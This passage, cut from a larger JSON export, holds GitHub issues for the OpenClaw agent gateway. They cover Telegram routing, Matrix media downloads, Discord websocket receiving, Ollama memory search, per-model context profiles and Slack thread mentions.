      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13567",
      "createdAt": "2026-02-10T18:24:10Z",
      "updatedAt": "2026-02-10T18:24:10Z",
      "author": "hanpaopao001",
      "labels": [],
      "taxonomy": {
        "channels": [
          "telegram"
        ],
        "platforms": [
          "linux"
        ],
        "components": [
          "web-ui",
          "config"
        ]
      }
    },
    {
      "number": 13481,
      "title": "[Bug]:Telegram messages routed as webchat in 2026.2.9",
      "body": "**Date:** 2026-02-10\n**Severity:** Medium (messages process but route incorrectly)\n\n## Issue\nMessages from Telegram arrive at gateway and are processed, but are **incorrectly routed as `messageChannel=webchat`** instead of `messageChannel=telegram`.\n\n## Steps to Reproduce\n1. Update OpenClaw to 2026.2.9\n2. Configure Telegram bot with local polling mode (no webhook)\n3. Send message to bot via Telegram\n4. Check logs at `/tmp/openclaw/openclaw-YYYY-MM-DD.log`\n\n## Observed Behavior\n```\n\"embedded run start: runId=94e3e78f-d47d-4719-9c4e-6486b86f4fd1\nsessionId=646b5411-cc21-4018-8b81-5a6a8bba2e0d\nprovider=anthropic model=claude-haiku-4-5\nmessageChannel=webchat\"  ← WRONG (should be \"telegram\")\n```\n\n## Expected Behavior\nMessages from Telegram should be marked as:\n```\nmessageChannel=telegram\n```\n\n## Environment\n- OS: Linux 4.18.0-25-generic (x64)\n- Node: v22.22.0\n- Gateway Port: 18789\n- Mode: local (lan bind)\n- Telegram Config: polling mode (webhook deleted, `getUpdates` active)\n\n## Config Details\n```json\n{\n  \"channels\": {\n    \"telegram\": {\n      \"enabled\": true,\n      \"botToken\": \"***REDACTED***\",\n      \"allowFrom\": [\"1111111\"],\n      \"groupPolicy\": \"disabled\",\n      \"streamMode\": \"partial\"\n    }\n  }\n}\n```\n\n## Logs\n- Last error before fix: `Telegram getUpdates conflict (409: Conflict: terminated by setWebhook request)` at 15:13:43\n- After `deleteWebhook` + gateway restart: Polling works, messages arrive but routing broken\n- No error messages in logs, silent routing issue\n\n## Related\n- Previous version (2026.2.8 or earlier) did NOT have this issue\n- Bug introduced in 2026.2.9 update\n\n## Reporter\n\nEnrique",
      "state": "closed",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13481",
      "createdAt": "2026-02-10T15:31:42Z",
      "updatedAt": "2026-02-10T18:22:34Z",
      "author": "erscoder",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [
          "telegram"
        ],
        "platforms": [
          "linux"
        ],
        "components": [
          "gateway",
          "web-ui",
          "config"
        ]
      }
    },
    {
      "number": 7363,
      "title": "Matrix media download not working - voice messages and images not downloaded",
      "body": "# Bug Report: Matrix Media Download Not Working\n\n## Environment\n- OpenClaw version: 2026.2.1\n- OS: macOS 15.7.3 (arm64)\n- Node: v25.3.0\n- Matrix plugin: loaded\n- Homeserver: Conduit (localhost:8008)\n\n## Problem\nVoice messages and images sent via Matrix are not being downloaded. The text content comes through (e.g., \"Voice message.ogg\" or \"Screenshot.png\") but the actual media files are not downloaded or made available to the agent.\n\n## Configuration\n- `channels.matrix.encryption: true` (but rooms are unencrypted)\n- E2EE was enabled, rooms are unencrypted\n- Tried with crypto state reset - no change\n\n## Observations\n1. Messages show filename (e.g., \"Voice message.ogg\") but no MediaPath in context\n2. No media download errors in logs\n3. No `mxc://` URLs or download attempts visible in verbose logs\n4. Earlier today (before some point) voice messages WERE being transcribed via Whisper\n\n## Error in Logs\n```\nTypeError: client.crypto.requestOwnUserVerification is not a function\n```\nThis error appears on startup but may be unrelated since rooms are unencrypted.\n\n## Steps to Reproduce\n1. Set up Matrix with Conduit homeserver\n2. Enable matrix plugin\n3. Send voice message or image from Element client\n4. Agent receives text placeholder but no actual media\n\n## Expected Behavior\nMedia files should be downloaded and made available to the agent at a local path (MediaPath in context).\n\n## Workaround\nNone found yet. Typing instead of voice messages works as a temporary workaround.\n",
      "state": "closed",
      "comments": 2,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/7363",
      "createdAt": "2026-02-02T18:55:41Z",
      "updatedAt": "2026-02-10T18:18:48Z",
      "author": "nicolasmertens",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "macos"
        ],
        "components": [
          "config"
        ]
      },
      "commentsData": [
        {
          "id": 3837256854,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/7363#issuecomment-3837256854",
          "createdAt": "2026-02-02T19:55:27Z",
          "updatedAt": "2026-02-02T19:55:27Z",
          "author": "nicolasmertens",
          "body": "Issue resolved after OpenClaw update to 2026.2.1. Media (voice messages and images) now downloading correctly. May have been a transient issue or fixed in the update."
        },
        {
          "id": 3837263525,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/7363#issuecomment-3837263525",
          "createdAt": "2026-02-02T19:57:57Z",
          "updatedAt": "2026-02-02T19:57:57Z",
          "author": "nicolasmertens",
          "body": "## Root Cause Found\n\nRelated to: https://github.com/openclaw/openclaw/issues/3499\n\nThe Matrix extension's `downloadContent()` handler expects a raw `Buffer`, but `@vector-im/matrix-bot-sdk` v0.8.0 returns `{data: Buffer, contentType: string}`.\n\n## Fix\n\n**File:** `extensions/matrix/src/matrix/monitor/media.ts` (lines 30-39)\n\n```typescript\n// Before (broken):\nconst buffer = await params.client.downloadContent(params.mxcUrl);\nif (buffer.byteLength > params.maxBytes) {\n  throw new Error(\"Matrix media exceeds configured size limit\");\n}\nreturn { buffer: Buffer.from(buffer) };\n\n// After (fixed):\nconst response = await params.client.downloadContent(params.mxcUrl);\n// Handle both old Buffer format and new {data, contentType} format\nconst buffer = Buffer.isBuffer(response) ? response : response.data;\nconst headerType = !Buffer.isBuffer(response) && response.contentType \n  ? response.contentType : undefined;\nif (buffer.byteLength > params.maxBytes) {\n  throw new Error(\"Matrix media exceeds configured size limit\");\n}\nreturn { buffer: Buffer.from(buffer), headerType };\n```\n\nThis fix handles both the old Buffer format and the new object format from matrix-bot-sdk v0.8.0.\n\n## Verified Working\n- Voice messages ✅\n- Images ✅  \n- Text ✅"
        }
      ]
    },
    {
      "number": 13562,
      "title": "[Feature]: Ollama Memory Search Provider",
      "body": "Currently ollama does not work as a provider for memorySearch\n\n```\n \"memorySearch\": {\n\n        \"enabled\": true,\n\n        \"provider\": \"ollama\",\n\n        \"model\": \"qwen3-embedding:0.6b\",\n\n        \"sources\": [\n\n          \"memory\"\n\n        ]\n\n      }\n```\n\nInvalid config at /Users/xxx/.openclaw/openclaw.json:\\n- agents.defaults.memorySearch.provider: Invalid input\n\nThe feature would aim to do the following:\n\nAdding \"ollama\" to the allowed provider enum in the config schema\nEnsuring the embedding endpoint (/api/embed) is supported\nWiring up the Ollama embedding model configuration\n\n@BrokenFinger98",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13562",
      "createdAt": "2026-02-10T18:13:31Z",
      "updatedAt": "2026-02-10T18:14:18Z",
      "author": "blastronaut",
      "labels": [
        "enhancement"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "linux"
        ],
        "components": [
          "config"
        ]
      }
    },
    {
      "number": 13561,
      "title": "[Bug]: Discord Plugin Bug Report - Real-time Message Receiving Broken",
      "body": "## Summary\nDiscord plugin can **send** messages and **poll** messages via REST API, but **real-time websocket receiving is broken**. Messages from users only appear when manually checking, not as live events.\n\n## Environment\n- OpenClaw Version: 2026.2.6-3\n- OS: Windows_NT 10.0.26100 (x64)\n- Node: v24.11.0\n\n## Discord Bot Settings (Verified)\n✅ Bot token is valid\n✅ Bot invited to server with Send Messages permission  \n✅ Message Content Intent: ENABLED\n✅ Server Members Intent: ENABLED\n\n## Symptoms\n\n### What WORKS:\n- Sending messages via `message tool` (REST API)\n- Polling messages via `message action=read` (REST API)\n\n### What BROKEN:\n- Real-time websocket/gateway message receiving\n- Messages sent by users do NOT trigger instant agent responses\n\n## Steps to Reproduce\n1. Configure Discord bot with valid token\n2. Enable Message Content Intent in Discord Developer Portal\n3. Send message from Discord client\n4. Observe: Agent does NOT receive real-time notification\n5. Run manual `message read` - message IS there\n\n## Expected Behavior\nAgent should receive real-time websocket events when users send messages in Discord.\n\n## Impact\nCannot use Discord for real-time mobile communication.\n",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13561",
      "createdAt": "2026-02-10T18:12:47Z",
      "updatedAt": "2026-02-10T18:12:47Z",
      "author": "cryptoholic25",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [
          "discord"
        ],
        "platforms": [
          "windows"
        ],
        "components": [
          "gateway",
          "config",
          "websocket"
        ]
      }
    },
    {
      "number": 13557,
      "title": "Feature: Context Profiles per Model (contextProfiles)",
      "body": "## Problem\n\nWhen OpenClaw falls back from a large-context model (e.g., Codex with ~1M tokens) to a smaller one (e.g., Haiku with 200K), the gateway re-sends the existing history — possibly truncated to fit the new `contextWindow`. However, there is **no mechanism to adjust which workspace files are injected** (MEMORY.md, daily notes, project files, etc.) based on the active model.\n\nThis means:\n- On a large-context model, the agent could benefit from loading 7 days of daily files, full MEMORY.md, and project files — but gets the same minimal set as smaller models.\n- On a small-context model (especially after mid-session fallback), the agent receives workspace files that may consume a disproportionate share of its context window.\n- The agent can only react *after* the context is already sent, by changing its own behavior (shorter responses, no additional file reads). It cannot retroactively reduce what was injected.\n\n## Proposed Solution\n\nAdd an optional `contextProfiles` configuration under `agents.defaults` (or per-agent) that maps model patterns to context-loading rules:\n\n```json5\n{\n  \"agents\": {\n    \"defaults\": {\n      \"contextProfiles\": {\n        // Matched by model ID prefix or alias\n        \"openai-codex/*\": {\n          \"workspaceFiles\": [\"SOUL.md\", \"TOOLS.md\", \"MEMORY.md\", \"LESSONS_LEARNED.md\", \"USER.md\", \"IDENTITY.md\", \"HEARTBEAT.md\"],\n          \"dailyFiles\": { \"days\": 7 },\n          \"compaction\": \"relaxed\"\n        },\n        \"anthropic/claude-opus-*\": {\n          \"workspaceFiles\": [\"SOUL.md\", \"TOOLS.md\", \"MEMORY.md\", \"LESSONS_LEARNED.md\", \"USER.md\"],\n          \"dailyFiles\": { \"days\": 3 },\n          \"compaction\": \"safeguard\"\n        },\n        \"anthropic/claude-sonnet-*\": {\n          \"workspaceFiles\": [\"SOUL.md\", \"TOOLS.md\"],\n          \"dailyFiles\": { \"days\": 1 },\n          \"compaction\": \"aggressive\"\n        },\n        \"anthropic/claude-haiku-*\": {\n          \"workspaceFiles\": [\"SOUL.md\"],\n          \"dailyFiles\": { \"days\": 0 },\n          \"compaction\": \"aggressive\"\n        }\n      }\n    }\n  }\n}\n```\n\n### Key behaviors:\n\n1. **On session start:** Match the primary model against `contextProfiles`, inject only the specified workspace files.\n2. **On mid-session fallback (`Model switched.`):** Re-evaluate the profile for the new model. On the next prompt assembly, use the new profile's rules for any additional file injection.\n3. **`dailyFiles.days`:** How many `memory/YYYY-MM-DD.md` files to auto-include (0 = none).\n4. **`workspaceFiles`:** Explicit allowlist of which workspace `.md` files to inject into the system prompt.\n5. **`compaction`:** Override compaction mode per model (some models handle large contexts better).\n\n### Fallback matching order:\n- Exact model ID match first (`anthropic/claude-haiku-4-5`)\n- Then glob/prefix match (`anthropic/claude-haiku-*`)\n- Then `\"default\"` key if present\n- If no match: current behavior (inject everything)\n\n## Benefits\n\n- **Cost efficiency:** Smaller models don't waste tokens on context they can't effectively use.\n- **Better performance:** Each model gets context proportional to its capabilities.\n- **Automatic:** No agent-side workarounds needed; the gateway handles it natively.\n- **Graceful fallback:** Mid-session model switches automatically adjust context density.\n\n## Current Workaround\n\nToday, the agent documents model profiles in `TOOLS.md` and manually adjusts its file-loading behavior based on the `model=` header. This works for *new* file reads but cannot reduce already-injected workspace files. The proposed feature would solve this at the gateway level.",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13557",
      "createdAt": "2026-02-10T18:08:36Z",
      "updatedAt": "2026-02-10T18:08:36Z",
      "author": "brugillo",
      "labels": [],
      "taxonomy": {
        "channels": [],
        "platforms": [],
        "components": [
          "gateway",
          "config"
        ]
      }
    },
    {
      "number": 13553,
      "title": "[Feature]: Save whatsapp/iMessage attachments to ~/clawd/temp for upload",
      "body": "## Summary\n\nDescribe the problem you are trying to solve or the opportunity you see.\n\n## Proposed solution\n\nWhat would you like Clawdbot to do?\n\n## Alternatives considered\n\nAny other approaches you have considered?\n\n## Additional context\n\nLinks, screenshots, or related issues.",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13553",
      "createdAt": "2026-02-10T18:02:47Z",
      "updatedAt": "2026-02-10T18:02:47Z",
      "author": "stev00z",
      "labels": [
        "enhancement"
      ],
      "taxonomy": {
        "channels": [
          "whatsapp",
          "imessage"
        ],
        "platforms": [],
        "components": []
      }
    },
    {
      "number": 13419,
      "title": "[Feature]: Option to disable implicit mention when bot is thread parent",
      "body": "## Summary\n\nWhen the bot is the parent of a Slack thread (i.e. the bot posted the first message), it responds to every reply in that thread — even without an explicit @mention. This is because `implicitMention` is set to `true` whenever `message.parent_user_id === ctx.botUserId`.\n\nFor use cases where `requireMention` is enabled, this is unexpected: users expect the bot to only respond when explicitly mentioned, regardless of who started the thread.\n\n## Proposed solution\n\nAdd a configuration option to disable implicit mention in threads where the bot is the parent. For example:\n\n```json\n{\n  \"channels\": {\n    \"slack\": {\n      \"thread\": {\n        \"implicitMentionAsParent\": false\n      }\n    }\n  }\n}\n```\n\nWhen `false`, the bot would require an explicit @mention even in threads it started. Default could remain `true` for backwards compatibility.\n\n## Alternatives considered\n\n- Hardcoding `implicitMention: false` — works but removes the behavior for all users with no way to opt back in\n- Using `requireMention: false` — goes too far in the opposite direction (bot responds to everything)\n\n## Additional context\n\n- Related PRs that attempted configurable thread mention behavior: #3093, #12796\n- Related PR for extending implicit mention to threads where bot was mentioned (not just parent): #6003\n- The `implicitMention` logic lives in `src/slack/monitor/message-handler/prepare.ts`\n\n✍️ **Author**: Claude Code with @carrotRakko (AI-written, human-approved)",
      "state": "open",
      "comments": 1,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13419",
      "createdAt": "2026-02-10T13:58:17Z",
      "updatedAt": "2026-02-10T18:01:37Z",
      "author": "carrotRakko",
      "labels": [],
      "taxonomy": {
        "channels": [
          "slack"
        ],
        "platforms": [],
        "components": [
          "config"
        ]
      },
      "commentsData": [
        {
          "id": 3879838525,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13419#issuecomment-3879838525",
          "createdAt": "2026-02-10T18:01:37Z",
          "updatedAt": "2026-02-10T18:01:37Z",
          "author": "lailoo",
          "body": "I addressed this issue in PR #13550\nIf you have some time, I'd really appreciate it if you could take a look.\n---\n**Fix:** Add `thread.implicitMentionAsParent` config option (default: `true`). When set to `false`, the bot requires an explicit @mention even in threads it started.\n"
        }
      ]
    }
  ]
}
